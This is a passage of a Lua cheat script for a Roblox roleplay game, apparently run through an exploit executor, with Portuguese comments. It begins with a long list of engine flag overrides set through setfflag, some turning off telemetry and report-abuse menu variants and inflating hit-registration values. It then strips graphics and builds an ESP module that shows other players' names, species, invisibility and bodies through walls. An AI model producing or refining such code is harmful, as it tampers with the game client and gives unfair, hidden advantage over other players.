			["DFIntAnimationParallelTimeBudgetUs"] = "0",
			["DFIntAnimationRateLimiterAssertAmount"] = "0",
			["DFIntAnimationRateLimiterMaxAmount"] = "0",
			["DFIntAnimationRateLimiterSeconds"] = "0",
			["DFIntAnimationScaleDampeningPercent"] = "0",
			["DFIntAnimationStreamTrackTrace"] = "0",
			["DFIntAnimatorTelemetryCollectionRate"] = "0",
			["DFIntAnimatorThrottleMaxFramesToSkip"] = "1",
			["DFIntAnimatorThrottleRccFramesToSkip"] = "999999999",
			["FIntDynamicHeadBorderSize"] = "0",
			["FFlagUGCValidateMoveDynamicHeadTest3"] = "False",
			["FFlagUGCValidateDynamicHeadMoodClient"] = "False",
			["FFlagUGCValidateDynamicHeadMoodClientVpfSnapshot"] = "False",
			["FFlagUGCValidateDynamicHeadMoodRCC"] = "False",
			["DFFlagUseDefaultDynamicHead2"] = "False",
			["FFlagDisableHSRForDynamicHead"] = "True",
			["DFFlagReduceFacialAnimationsWhenFacsStreaming"] = "False",
			["DFFlagReduceFacialAnimationsWhenFacsStreaming2"] = "False",
			["FFlagFacialAnimation1BetaFeature"] = "False",
			["FFlagFacialAnimationRecordingBetaFeature"] = "False",
			["FFlagFacialAnimationRecordingInStudio"] = "False",
			["FFlagFacialAnimationStreamingCheckPauseStateAfterEmote2"] = "False",
			["FFlagFacialAnimationStreamingClearAllConnectionsFix2"] = "False",
			["FFlagFacialAnimationStreamingClearTrackImprovementsV2"] = "False",
			["FFlagFacialAnimationStreamingIfNoDynamicHeadDisableA2C"] = "False",
			["FFlagFacialAnimationStreamingRcc"] = "False",
			["FFlagFacialAnimationStreamingSearchForReplacementWhenRemovingAnimator"] = "False",
			["FFlagFacialAnimationStreamingServiceUniverseSettingsEnableAudio"] = "False",
			["FFlagFacialAnimationStreamingServiceUniverseSettingsEnableVideo"] = "False",
			["FFlagFacialAnimationStreamingServiceUniverseSettingsMock"] = "False",
			["FFlagFacialAnimationStreamingServiceUserSettingsCache"] = "False",
			["FFlagFacialAnimationStreamingServiceUserSettingsMock"] = "False",
			["FFlagFacialAnimationStreamingServiceUserSettingsOptInAudio"] = "False",
			["FFlagFacialAnimationStreamingServiceUserSettingsOptInVideo"] = "False",
			["FFlagFacialAnimationStreamingServiceUseServerThrottling"] = "False",
			["FFlagFacialAnimationStreamingUseEnableFlags2"] = "False",
			["FFlagFacialAnimationStreamingValidateAnimatorBeforeRemoving"] = "False",
			["SFFlagFacialAnimation1BetaFeatureRoleSet"] = "False",
			["SFFlagFacialAnimation1BetaFeatureRolloutPercent"] = "False",
			["SFFlagFacialAnimationRecordingBetaFeatureRoleSet"] = "False",
			["SFFlagFacialAnimationRecordingBetaFeatureRolloutPercent"] = "False",
			["SFFlagFacialAnimationStreamRccThrottleServerCount"] = "False",
			["SFFlagReduceFacialAnimationsAudioVideoMode"] = "False",
			["FFlagDebugDeterministicParticles"] = "False",
			["FFlagFixOutdatedParticles"] = "False",
			["FFlagFixOutdatedTimeScaleParticles"] = "False",
			["FFlagFixParticleAttachmentCulling"] = "False",
			["FFlagFixParticleEmissionBias"] = "False",
			["DFIntPerformanceControlFrameTimeMax"] = "1",
			["DFIntPerformanceControlFrameTimeMaxUtility"] = "-1",
			["DFIntBufferCompressionLevel"] = "0",
			["FFlagSimEnableDCD10"] = "True",
			["FFlagPushFrameTimeToHarmony"] = "True",
			["FFlagUISUseLastFrameTimeInUpdateInputSignal"] = "True",
			["DFIntNumFramesAllowedToBeAboveError"] = "1",
			["DFIntVisibilityCheckRayCastLimitPerFrame"] = "10",
			["DFIntTimeBetweenSendConnectionAttemptsMS"] = "200",
			["DFFlagPerformanceControlEnableInference"] = "True",
			["DFFlagPerformanceControlEnableMemoryProbing"] = "True",
			["DFFlagPerformanceControlIXPMemoryBufferConstantCheck"] = "True",
			["DFIntDebugPerformanceControlUsedMemoryMB"] = "1",
			["DFIntPerformanceControlIXPBestQueueSize"] = "1",
			["DFIntPerformanceControlIXPQueueSizeBestUtility"] = "1",
			["DFIntPerformanceControlIXPQueueSizeUtilityExponentTenThousandths"] = "1",
			["DFIntPerformanceControlPredictedOOMAbsLimitExtraBufferMB"] = "1",
			["DFIntPerformanceControlSoundReloadLatencyMaxValue"] = "1",
			["DFIntPerformanceControlSoundReloadLatencyMinValue"] = "1",
			["DFIntPerformanceControlSoundReloadLatencyTargetUtility"] = "1",
			["FFlagDebugGraphicsPreferOpenGL"] = "True",
			["DFIntDebugRestrictGCDistance"] = "1",
			["FFlagDebugGraphicsPreferD3D11FL10"] = "True",
			["FFlagRenderPerformanceTelemetry"] = "False",
			["FIntRenderLocalLightFadeInMs_enabled"] = "99999",
			["FFlagEnableReportAbuseMenuRoact2"] = "false",
			["FIntReportDeviceInfoRollout"] = "0",
			["FFlagEnableFavoriteButtonForUgc"] = "true",
			["FFlagEnableReportAbuseMenuRoactABTest2"] = "False",
			["FFlagEnableBubbleChatFromChatService"] = "False",
			["FFlagEnableReportAbuseMenuLayerOnV3"] = "false",
			["DFFlagESGamePerfMonitorEnabled"] = "False",
			["FIntStartupInfluxHundredthsPercentage"] = "0",
			["FFlagEnableBetaBadgeLearnMore"] = "false",
			["FFlagEnableInGameMenuChromeABTest2"] = "False",
			["FFlagEnableBubbleChatConfigurationV2"] = "False",
			["FFlagEnableNewInviteMenuIXP2"] = "False",
			["FFlagGlobalWindRendering"] = "false",
			["FFlagUserPreventOldBubbleChatOverlap"] = "False",
			["FFlagRenderCheckThreading"] = "True",
			["FFlagBetaBadgeLearnMoreLinkFormview"] = "false",
			["FFlagGraphicsSettingsOnlyShowValidModes"] = "True",
			["FFlagPreloadMinimalFonts"] = "True",
			["FFlagNullCheckCloudsRendering"] = "True",
			["FFlagGameBasicSettingsFramerateCap"] = "True",
			["FIntCameraMaxZoomDistance"] = "99999",
			["FFlagControlBetaBadgeWithGuac"] = "false",
			["FStringVoiceBetaBadgeLearnMoreLink"] = "null",
			["FIntRenderLocalLightFadeInMs"] = "0",
			["DFIntCullFactorPixelThresholdShadowMapHighQuality"] = "2147483647",
			["DFIntCullFactorPixelThresholdShadowMapLowQuality"] = "2147483647",
			["FFlagRenderNoLowFrmBloom"] = "False",
			["FIntGrassMovementReducedMotionFactor"] = "0",
			["DFIntTextureCompositorActiveJobs"] = "0",
			["DFFlagUseVisBugChecks"] = "False",
			["FFlagEnableVisBugChecks27"] = "False",
			["FFlagVisBugChecksThreadYield"] = "False",
			["FIntEnableVisBugChecksHundredthPercent27"] = "0",
			["FIntDebugTextureManagerSkipMips"] = "2",
			["FFlagAlwaysShowVRToggleV3"] = "False",
			["FFlagAssetPreloadingIXP"] = "True",
			["FFlagLuaAppLegacyInputSettingRefactor"] = "True",
			["FFlagQuaternionPoseCorrection"] = "True",
			["DFFlagEnableTexturePreloading"] = "True",
			["FFlagEnableInGameMenuDurationLogger"] = "False",
			["FIntRenderMaxShadowAtlasUsageBeforeDownscale"] = "0",
			["FFlagRenderLegacyShadowsQualityRefactor"] = "True",
			["FFlagVideoReportHardwareBufferMetrics"] = "True",
			["FFlagEnableAudioPannerFiltering"] = "True",
			["DFFlagAudioUseVolumetricPanning"] = "True",
			["FIntUnifiedLightingBlendZone"] = "0",
			["FIntDirectionalAttenuationMaxPoints"] = "0",
			["FFlagVideoServiceAddHardwareCodecMetrics"] = "True",
			["FIntRenderMeshOptimizeVertexBuffer"] = "1",
			["FFlagSimEnableDCD16"] = "True",
			["FFlagImproveShiftLockTransition"] = "True",
			["DFIntAssetPreloading"] = "2147483647",
			["FFlagContentProviderPreloadHangTelemetry"] = "False",
			["DFFlagAudioEnableVolumetricPanningForPolys"] = "True",
			["FIntDebugFRMOptionalMSAALevelOverride"] = "0",
			["FIntSSAOMipLevels"] = "0",
			["FFlagDebugForceGenerateHSR"] = "True",
			["FIntUITextureMaxUpdateDepth"] = "1",
			["DFFlagTeleportClientAssetPreloadingDoingExperiment2"] = "True",
			["DFFlagEnableSoundPreloading"] = "True",
			["FFlagDebugEnableDirectAudioOcclusion2"] = "True",
			["FStringDebugLuaLogLevel"] = "trace",
			["DFFlagEnableMeshPreloading2"] = "True",
			["DFFlagTeleportClientAssetPreloadingEnabledIXP"] = "True",
			["FStringDebugLuaLogPattern"] = "ExpChat/mountClientApp",
			["FFlagRenderDynamicResolutionScale7"] = "True",
			["FFlagUserShowGuiHideToggles"] = "True",
			["DFIntNumAssetsMaxToPreload"] = "2147483647",
			["DFFlagSimOptimizeSetSize"] = "True",
			["FFlagChatTranslationEnableSystemMessage"] = "False",
			["DFFlagTeleportClientAssetPreloadingEnabledIXP2"] = "True",
			["DFFlagTeleportPreloadingMetrics5"] = "True",
			["FFlagMessageBusCallOptimization"] = "True",
			["FFlagDebugSSAOForce"] = "False",
			["FFlagDebugForceFSMCPULightCulling"] = "True",
			["DFFlagDebugSkipMeshVoxelizer"] = "True",
			["DFFlagAudioEnableVolumetricPanningForMeshes"] = "True",
			["FIntVertexSmoothingGroupTolerance"] = "0",
			["FFlagDisableFeedbackSoothsayerCheck"] = "False",
			["DFIntHACDPointSampleDistApartTenths"] = "2147483647",
			["DFFlagTeleportClientAssetPreloadingEnabled9"] = "True",
			["FFlagAddHapticsToggle"] = "False",
			["FFlagUserSoundsUseRelativeVelocity2"] = "True",
			["DFFlagTeleportClientAssetPreloadingDoingExperiment"] = "True",
			["FFlagHighPrecisionHitBox"] = "True",
			["FFlagFastHitDetection"] = "True",
			["FFlagSmoothHitreg"] = "True",
			["FFlagLowLatencyHitreg"] = "True",
			["FFlagOptimizeHitreg"] = "True",
			["FFlagAccurateHitbox"] = "True",
			["DFIntNetPrioritizeHitRegPackets"] = "2147483647",
			["DFIntHitRegLatencyComp"] = "2147483647",
			["DFIntNetPrioHitRegHighPingBoost"] = "2147483647",
			["DFIntNetCompHitRegBuffer"] = "2147483647",
			["DFIntDataSenderMaxBandwidthBps"] = "2147483647",
			["FFlagDynamicHitbox"] = "True",
			["FFlagEnhanceHitdetection"] = "True",
			["DFIntPhysHitRegSyncRate"] = "2147483647"
		}

		for flag, val in pairs(fflags) do
			pcall(function() setfflag(flag, val) end)
		end
	end

	-- Standard Lua Optimizations
	local lighting = game:GetService("Lighting")
	lighting.GlobalShadows = false
	lighting.FogEnd = 9e9
	lighting.Brightness = 1

	settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

	for _, v in ipairs(game:GetDescendants()) do
		if v:IsA("BasePart") then
			v.CastShadow = false
		elseif v:IsA("Decal") or v:IsA("Texture") then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Enabled = false
		elseif v:IsA("MeshPart") then
			v.RenderFidelity = Enum.RenderFidelity.Performance
		end
	end
end

-- ==================== ESP (espavancado) ====================
local ESPControl = (function()
	local Players = game:GetService("Players")
	local CoreGui = game:GetService("CoreGui")
	local RunService = game:GetService("RunService")
	local CollectionService = game:GetService("CollectionService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local LocalPlayer = Players.LocalPlayer

	-- Cores das espécies
	local SPECIES_COLORS = {
		["Heretic"] = Color3.fromRGB(188, 101, 169),
		["Hybrid"] = Color3.fromRGB(245, 185, 102),
		["Original"] = Color3.fromRGB(178, 58, 64),
		["Phoenix"] = Color3.fromRGB(223, 129, 96),
		["Siphoner"] = Color3.fromRGB(114, 147, 202),
		["Tribrid"] = Color3.fromRGB(36, 70, 242),
		["TransitioningVampire"] = Color3.fromRGB(138, 49, 52),
		["Vampire"] = Color3.fromRGB(205, 54, 59),
		["Werewitch"] = Color3.fromRGB(201, 69, 150),
		["Werewolf"] = Color3.fromRGB(249, 228, 103),
		["Witch"] = Color3.fromRGB(195, 145, 195),
		["Mortal"] = Color3.fromRGB(195, 145, 195),
		["Hunter"] = Color3.fromRGB(120, 199, 114),
		["Immortal"] = Color3.fromRGB(126, 53, 248),
		["Muse"] = Color3.fromRGB(254, 194, 14),
	}

	local SPECIES_DISPLAY = {
		["Heretic"] = "Bloodwitch",
		["Hybrid"] = "Hybrid",
		["Original"] = "Firstblood",
		["Phoenix"] = "Phoenix",
		["Siphoner"] = "Siphoner",
		["Tribrid"] = "Triblood",
		["TransitioningVampire"] = "Trans. Vampire",
		["Vampire"] = "Vampire",
		["Werewitch"] = "Werewitch",
		["Werewolf"] = "Werewolf",
		["Witch"] = "Witch",
		["Mortal"] = "Mortal",
		["Hunter"] = "Hunter",
		["Immortal"] = "Immortal",
		["Muse"] = "Muse",
	}

	local FONT_REGULAR = Font.new("rbxassetid://12187377099", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
	local FONT_SEMI_BOLD = Font.new("rbxassetid://12187377099", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal)
	local FONT_BOLD = Font.new("rbxassetid://12187377099", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

	local ESP_CACHE = {}
	local BODY_CACHE = {}

	-- Variáveis de controle (modificadas pela UI)
	local espEnabled = false
	local espRange = 900
	local showFreyaBody = true

	-- Função para verificar se o jogador está no lobby/seleção de personagem
	local function isInLobby(player)
		return player:GetAttribute("InCharacterSelection") == true
	end

	local function getSpeciesColor(species)
		return SPECIES_COLORS[species] or Color3.fromRGB(200, 200, 200)
	end

	local function getSpeciesName(species)
		return SPECIES_DISPLAY[species] or species or "Unknown"
	end

	local function isInvisible(character)
		if character then
			local primaryPart = character.PrimaryPart
			if primaryPart and (primaryPart:HasTag("Invisique") or primaryPart:HasTag("InvisiqueConfero")) then
				return true
			end
		end
		return false
	end

	local function isMuse(player, character)
		local cName = ""
		if player then
			cName = player:GetAttribute("CharacterName") or ""
		end
		if cName == "" and character then
			cName = character:GetAttribute("CharacterName") or character.Name or ""
		end
		cName = string.lower(cName)
		return string.find(cName, "cleo sowande") ~= nil or string.find(cName, "muse") ~= nil
	end

	local function removeESP(player)
		if ESP_CACHE[player] then
			pcall(function()
				if ESP_CACHE[player].connection then
					ESP_CACHE[player].connection:Disconnect()
				end
				ESP_CACHE[player].gui:Destroy()
			end)
			ESP_CACHE[player] = nil
		end
	end

	local function getLimboBodyForPlayer(player)
		local charNameAttr = player:GetAttribute("CharacterName")

		-- Verificar playerCloneFolder (pasta real dos corpos mortos)
		local cloneFolder = workspace:FindFirstChild("playerCloneFolder")
		if cloneFolder then
			for _, child in ipairs(cloneFolder:GetChildren()) do
				if child:IsA("Model") then
					if child.Name == player.Name or (charNameAttr and child:GetAttribute("CharacterName") == charNameAttr) then
						return child
					end
				end
			end
		end

		local rsCloneFolder = ReplicatedStorage:FindFirstChild("playerCloneFolder")
		if rsCloneFolder then
			for _, child in ipairs(rsCloneFolder:GetChildren()) do
				if child:IsA("Model") then
					if child.Name == player.Name or (charNameAttr and child:GetAttribute("CharacterName") == charNameAttr) then
						return child
					end
				end
			end
		end

		return nil
	end

	local function createESP(player)
		removeESP(player)

		if not espEnabled then return end
		if player == LocalPlayer then return end
		if isInLobby(player) then return end -- NÃO MOSTRA ESP PARA JOGADORES NO LOBBY

		local character = player.Character
		local limboBody = getLimboBodyForPlayer(player)
		local targetModel = limboBody or character

		if not targetModel then return end

		local head = targetModel:FindFirstChild("Head") or targetModel:FindFirstChild("HumanoidRootPart")
		if not head then return end

		local success, err = pcall(function()
			local bill = Instance.new("BillboardGui")
			bill.Name = "ESP_" .. player.Name
			bill.Parent = CoreGui
			bill.Adornee = head
			bill.Size = UDim2.new(0, 220, 0, 80)
			bill.StudsOffset = Vector3.new(0, 2, 0)
			bill.AlwaysOnTop = true
			bill.MaxDistance = espRange

			local charName = Instance.new("TextLabel")
			charName.Name = "CharName"
			charName.Size = UDim2.new(1, 0, 0, 24)
			charName.Position = UDim2.new(0, 0, 0, 0)
			charName.BackgroundTransparency = 1
			charName.Text = player:GetAttribute("CharacterName") or player.Name
			charName.TextColor3 = Color3.fromRGB(255, 255, 255)
			charName.FontFace = FONT_BOLD
			charName.TextSize = 23
			charName.TextStrokeTransparency = 1
			charName.Parent = bill

			local charStroke = Instance.new("UIStroke")
			charStroke.Thickness = 1
			charStroke.Color = Color3.fromRGB(0, 0, 0)
			charStroke.Transparency = 0
			charStroke.Parent = charName

			local userName = Instance.new("TextLabel")
			userName.Name = "UserName"
			userName.Size = UDim2.new(1, 0, 0, 22)
			userName.Position = UDim2.new(0, 0, 0, 24)
			userName.BackgroundTransparency = 1
			userName.Text = player.Name
			userName.TextColor3 = Color3.fromRGB(255, 255, 255)
			userName.FontFace = FONT_REGULAR
			userName.TextSize = 25
			userName.TextStrokeTransparency = 0
			userName.Parent = bill

			local userStroke = Instance.new("UIStroke")
			userStroke.Thickness = 1
			userStroke.Color = Color3.fromRGB(0, 0, 0)
			userStroke.Transparency = 0.4
			userStroke.Parent = userName

			local speciesLbl = Instance.new("TextLabel")
			speciesLbl.Name = "Species"
			speciesLbl.Size = UDim2.new(1, 0, 0, 18)
			speciesLbl.Position = UDim2.new(0, 0, 0, 46)
			speciesLbl.BackgroundTransparency = 1
			speciesLbl.Text = "Mortal"
			speciesLbl.TextColor3 = Color3.fromRGB(195, 145, 195)
			speciesLbl.FontFace = FONT_SEMI_BOLD
			speciesLbl.TextSize = 20
			speciesLbl.TextStrokeTransparency = 1
			speciesLbl.Parent = bill

			local speciesStroke = Instance.new("UIStroke")
			speciesStroke.Thickness = 1
			speciesStroke.Color = Color3.fromRGB(0, 0, 0)
			speciesStroke.Transparency = 0.7
			speciesStroke.Parent = speciesLbl

			local invisLbl = Instance.new("TextLabel")
			invisLbl.Name = "Invisible"
			invisLbl.Size = UDim2.new(1, 0, 0, 16)
			invisLbl.Position = UDim2.new(0, 0, 0, 64)
			invisLbl.BackgroundTransparency = 1
			invisLbl.Text = "[INVISIVEL]"
			invisLbl.TextColor3 = Color3.fromRGB(255, 100, 255)
			invisLbl.FontFace = FONT_BOLD
			invisLbl.TextSize = 17
			invisLbl.TextStrokeTransparency = 1
			invisLbl.Visible = false
			invisLbl.Parent = bill

			local invisStroke = Instance.new("UIStroke")
			invisStroke.Thickness = 1
			invisStroke.Color = Color3.fromRGB(0, 0, 0)
			invisStroke.Transparency = 0.6
			invisStroke.Parent = invisLbl

			local connection
			connection = RunService.RenderStepped:Connect(function()
				if not bill or not bill.Parent then
					if connection then connection:Disconnect() end
					return
				end

				-- Se entrou no lobby, remove o ESP
				if isInLobby(player) then
					removeESP(player)
					return
				end

				local currentLimbo = getLimboBodyForPlayer(player)
				local activeChar = player.Character
				local currentTarget = currentLimbo or activeChar

				if not currentTarget then
					bill.Adornee = nil
					return
				end

				local currentHead = currentTarget:FindFirstChild("Head") or
					currentTarget:FindFirstChild("HumanoidRootPart")
				if not currentHead or not currentHead:IsDescendantOf(game) then
					bill.Adornee = nil
					return
				end

				-- Atualiza adornee dinamicamente!
				bill.Adornee = currentHead

				local cName = player:GetAttribute("CharacterName") or player.Name

				if currentLimbo then
					-- ESTADO: CORPO MORTO (No Limbo)
					charName.Text = "[CORPO MORTO] " .. cName
					charName.TextColor3 = Color3.fromRGB(255, 50, 50) -- vermelho para corpo morto

					local species = currentLimbo:GetAttribute("SpecieType") or player:GetAttribute("SpecieType") or
						"Mortal"
					if species == "Witch" and isMuse(player, currentLimbo) then
						species = "Muse"
					end
					local speciesColor = getSpeciesColor(species)
					local speciesName = getSpeciesName(species)

					speciesLbl.Text = speciesName
					speciesLbl.TextColor3 = speciesColor
					invisLbl.Visible = isInvisible(currentLimbo)
				else
					-- ESTADO: VIVO / NORMAL
					charName.Text = cName

					local species = activeChar:GetAttribute("SpecieType") or player:GetAttribute("SpecieType") or
						"Mortal"
					if species == "Witch" and isMuse(player, activeChar) then
						species = "Muse"
					end
					local speciesColor = getSpeciesColor(species)
					local speciesName = getSpeciesName(species)

					speciesLbl.Text = speciesName
					speciesLbl.TextColor3 = speciesColor
					charName.TextColor3 = speciesColor
					invisLbl.Visible = isInvisible(activeChar)
				end
			end)

			ESP_CACHE[player] = { gui = bill, connection = connection }
		end)
		if not success then
			warn("Erro ao criar ESP para " .. player.Name .. ": " .. tostring(err))
			pcall(function()
				Rayfield:Notify({
					Title = "Erro ao Criar ESP",
					Content = "Jogador " .. player.Name .. ": " .. tostring(err),
					Duration = 5
				})
			end)
		end
	end

	local function removeBodyESP(model)
		if BODY_CACHE[model] then
			pcall(function()
				if BODY_CACHE[model].connection then
					BODY_CACHE[model].connection:Disconnect()
				end
				BODY_CACHE[model].gui:Destroy()
			end)
			BODY_CACHE[model] = nil
		end
	end

	local function getBodyOwner(model)
		local player = Players:FindFirstChild(model.Name)
		if player then
			return player
		end

		local charName = model:GetAttribute("CharacterName")
		if charName then
			for _, p in ipairs(Players:GetPlayers()) do
				if p:GetAttribute("CharacterName") == charName then
					return p
				end
			end
		end

		return nil
	end

	local function createBodyESP(model, isLimboBody, isFreyaAstral)
		removeBodyESP(model)

		if not espEnabled then return end

		-- Forcar deteccao de Freya pelo nome ou atributo
		local charName = model:GetAttribute("CharacterName") or model.Name or ""
		if string.find(string.lower(charName), "freya") then
			isFreyaAstral = true
		end

		if isFreyaAstral and not showFreyaBody then return end

		local head = model:FindFirstChild("Head") or model:FindFirstChild("HumanoidRootPart")
		if not head then return end

		-- Verificar se o dono está no lobby
		local owner = getBodyOwner(model)
		if owner and isInLobby(owner) then return end -- NÃO MOSTRA CORPO DE QUEM ESTÁ NO LOBBY

		pcall(function()
			local bill = Instance.new("BillboardGui")
			bill.Name = "ESP_BODY_" .. model.Name
			bill.Parent = CoreGui
			bill.Adornee = head
			bill.Size = UDim2.new(0, 220, 0, 80)
			bill.StudsOffset = Vector3.new(0, 2, 0)
			bill.AlwaysOnTop = true
			bill.MaxDistance = espRange

			local charName = Instance.new("TextLabel")
			charName.Name = "CharName"
			charName.Size = UDim2.new(1, 0, 0, 24)
			charName.Position = UDim2.new(0, 0, 0, 0)
			charName.BackgroundTransparency = 1
			charName.FontFace = FONT_BOLD
			charName.TextSize = 21
			charName.TextStrokeTransparency = 1
			charName.Parent = bill

			local charStroke = Instance.new("UIStroke")
			charStroke.Thickness = 1
			charStroke.Color = Color3.fromRGB(0, 0, 0)
			charStroke.Transparency = 0.6
			charStroke.Parent = charName

			local userName = Instance.new("TextLabel")
			userName.Name = "UserName"
			userName.Size = UDim2.new(1, 0, 0, 22)
			userName.Position = UDim2.new(0, 0, 0, 24)
			userName.BackgroundTransparency = 1
			userName.TextColor3 = Color3.fromRGB(180, 180, 180)
			userName.FontFace = FONT_REGULAR
			userName.TextSize = 20
			userName.TextStrokeTransparency = 1
			userName.Parent = bill

			local userStroke = Instance.new("UIStroke")
			userStroke.Thickness = 1
			userStroke.Color = Color3.fromRGB(0, 0, 0)
			userStroke.Transparency = 0.7
			userStroke.Parent = userName

			local speciesLbl = Instance.new("TextLabel")
			speciesLbl.Name = "Species"
			speciesLbl.Size = UDim2.new(1, 0, 0, 18)
			speciesLbl.Position = UDim2.new(0, 0, 0, 46)
			speciesLbl.BackgroundTransparency = 1
			speciesLbl.Text = "Mortal"
			speciesLbl.TextColor3 = Color3.fromRGB(195, 145, 195)
			speciesLbl.FontFace = FONT_SEMI_BOLD
			speciesLbl.TextSize = 14
			speciesLbl.TextStrokeTransparency = 1
			speciesLbl.Parent = bill

			local speciesStroke = Instance.new("UIStroke")
			speciesStroke.Thickness = 1
			speciesStroke.Color = Color3.fromRGB(0, 0, 0)
			speciesStroke.Transparency = 0.7
			speciesStroke.Parent = speciesLbl

			local invisLbl = Instance.new("TextLabel")
			invisLbl.Name = "Invisible"
			invisLbl.Size = UDim2.new(1, 0, 0, 16)
			invisLbl.Position = UDim2.new(0, 0, 0, 64)
			invisLbl.BackgroundTransparency = 1
			invisLbl.Text = "[INVISIVEL]"
			invisLbl.TextColor3 = Color3.fromRGB(255, 100, 255)
			invisLbl.FontFace = FONT_BOLD
			invisLbl.TextSize = 13
			invisLbl.TextStrokeTransparency = 1
			invisLbl.Visible = false
			invisLbl.Parent = bill

			local invisStroke = Instance.new("UIStroke")
			invisStroke.Thickness = 1
			invisStroke.Color = Color3.fromRGB(0, 0, 0)
			invisStroke.Transparency = 0.6
			invisStroke.Parent = invisLbl

			local connection
			connection = RunService.RenderStepped:Connect(function()
				if not bill or not bill.Parent then
					if connection then connection:Disconnect() end
					return
				end

				-- Anti-freeze: se o head do corpo sumiu do jogo, remove o ESP
				if not head or not head:IsDescendantOf(game) then
					removeBodyESP(model)
					return
				end

				-- Se o dono entrou no lobby, remove o ESP do corpo
				local bodyOwner = getBodyOwner(model)
				if bodyOwner and isInLobby(bodyOwner) then
					removeBodyESP(model)
					return
				end

				local ownerName = bodyOwner and bodyOwner.Name or model.Name
				local cName = model:GetAttribute("CharacterName") or
					(bodyOwner and bodyOwner:GetAttribute("CharacterName")) or ownerName

				-- Corpo fisico da Freya: mostra so [CORPO] nome, sem username/especie
				if isFreyaAstral then
					charName.Text = "[CORPO] " .. cName
					charName.TextColor3 = Color3.fromRGB(255, 255, 255)
					userName.Visible = false
					speciesLbl.Visible = false
					invisLbl.Visible = false
					return
				elseif isLimboBody then
					charName.Text = "[CORPO MORTO] " .. cName
					charName.TextColor3 = Color3.fromRGB(255, 50, 50)
				else
					charName.Text = "[CORPO] " .. cName
					charName.TextColor3 = Color3.fromRGB(255, 255, 255)
				end

				userName.Visible = true
				userName.Text = "@" .. ownerName

				local species = model:GetAttribute("SpecieType") or (bodyOwner and bodyOwner:GetAttribute("SpecieType")) or
					"Mortal"
				if species == "Witch" and isMuse(bodyOwner, model) then
					species = "Muse"
				end
				local speciesColor = getSpeciesColor(species)
				local speciesName = getSpeciesName(species)

				speciesLbl.Visible = true
				speciesLbl.Text = speciesName
				speciesLbl.TextColor3 = speciesColor

				invisLbl.Visible = isInvisible(model)
			end)

			BODY_CACHE[model] = { gui = bill, connection = connection }

			head.AncestryChanged:Connect(function()
				if not head:IsDescendantOf(game) then
					removeBodyESP(model)
				end
			end)
		end)
	end

	local function scanForPhysicalBodies()
		local found = {}
		local freyaAstralBodies = {}

		-- Verificar AstralProjection folder para corpos astrais da Freya
		local astralFolder = workspace:FindFirstChild("AstralProjection")
		if astralFolder then
			for _, child in ipairs(astralFolder:GetChildren()) do
				if child:IsA("Model") then
					local charName = child:GetAttribute("CharacterName") or child.Name
					if string.find(string.lower(charName), "freya") then
						freyaAstralBodies[child] = true
					else
						found[child] = true
					end
				end
			end
		end

		-- Varredura por tags do CollectionService
		for _, tag in ipairs({ "AstralProjection", "AstralProjectioneffect", "AstralProjectionEffect", "Astral", "AstralBody" }) do
			for _, part in ipairs(CollectionService:GetTagged(tag)) do
				local model = part
				while model and model ~= workspace do
					if model:IsA("Model") then
						break
					end
					model = model.Parent
				end
				if model and model:IsA("Model") and model ~= workspace then
					if not Players:GetPlayerFromCharacter(model) then
						local charName = model:GetAttribute("CharacterName") or model.Name
						if string.find(string.lower(charName), "freya") then
							freyaAstralBodies[model] = true
						else
							found[model] = true
						end
					end
				end
			end
		end

		-- Varredura por duplicados de nome (pula se ja esta em playerCloneFolder ou playerInLimboFolder)
		local limboParentNames = { playerInLimboFolder = true, playerCloneFolder = true }
		local function isLimboParent(child)
			return child.Parent and limboParentNames[child.Parent.Name] == true
		end

		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				local name = player.Name
				local charNameAttr = player:GetAttribute("CharacterName")

				local entities = workspace:FindFirstChild("Entities")
				if entities then
					for _, child in ipairs(entities:GetChildren()) do
						if child:IsA("Model") and child ~= player.Character and not isLimboParent(child) then
							local isMatch = (child.Name == name) or
								(charNameAttr and (child.Name == charNameAttr or child:GetAttribute("CharacterName") == charNameAttr))
							if isMatch then
								found[child] = true
							end
						end
					end
				end

				local debris = workspace:FindFirstChild("Debris")
				if debris then
					for _, child in ipairs(debris:GetChildren()) do
						if child:IsA("Model") and child ~= player.Character and not isLimboParent(child) then
							local isMatch = (child.Name == name) or
								(charNameAttr and (child.Name == charNameAttr or child:GetAttribute("CharacterName") == charNameAttr))
							if isMatch then
								found[child] = true
							end
						end
					end
				end

				for _, child in ipairs(workspace:GetChildren()) do
					if child:IsA("Model") and child ~= player.Character and not isLimboParent(child) and not found[child] then
						local isMatch = (child.Name == name) or
							(charNameAttr and (child.Name == charNameAttr or child:GetAttribute("CharacterName") == charNameAttr))
						if isMatch then
							found[child] = true
						end
					end
				end
			end
		end

		return found, freyaAstralBodies
	end

	local function enableESPAll()
		for _, player in ipairs(Players:GetPlayers()) do
			if not ESP_CACHE[player] and not isInLobby(player) then
				createESP(player)
			end
		end
	end

	local function clearAllESP()
		local espPlayers = {}
		for player in pairs(ESP_CACHE) do table.insert(espPlayers, player) end
		for _, player in ipairs(espPlayers) do removeESP(player) end

		local bodyModels = {}
		for model in pairs(BODY_CACHE) do table.insert(bodyModels, model) end
		for _, model in ipairs(bodyModels) do removeBodyESP(model) end

		-- Limpeza total de seguranca no CoreGui
		for _, child in ipairs(CoreGui:GetChildren()) do
			if child:IsA("BillboardGui") and (string.sub(child.Name, 1, 4) == "ESP_" or string.sub(child.Name, 1, 9) == "ESP_BODY_") then
				pcall(function() child:Destroy() end)
			end
		end
	end

	-- API de controle para a UI
	local ESPControl = {}

	function ESPControl:setEnabled(state)
		espEnabled = state
		if espEnabled then
			enableESPAll()
		else
			clearAllESP()
		end
	end

	function ESPControl:setRange(value)
		espRange = value
		for _, cache in pairs(ESP_CACHE) do
			if cache.gui then cache.gui.MaxDistance = espRange end
		end
		for _, cache in pairs(BODY_CACHE) do
			if cache.gui then cache.gui.MaxDistance = espRange end
		end
	end

	function ESPControl:setShowFreyaBody(state)
		showFreyaBody = state
		if not state then
			-- Remove ESPs de corpo da Freya imediatamente
			local toRemove = {}
			for body in pairs(BODY_CACHE) do
				local charName = body:GetAttribute("CharacterName") or body.Name
				if string.find(string.lower(charName), "freya") then
					table.insert(toRemove, body)
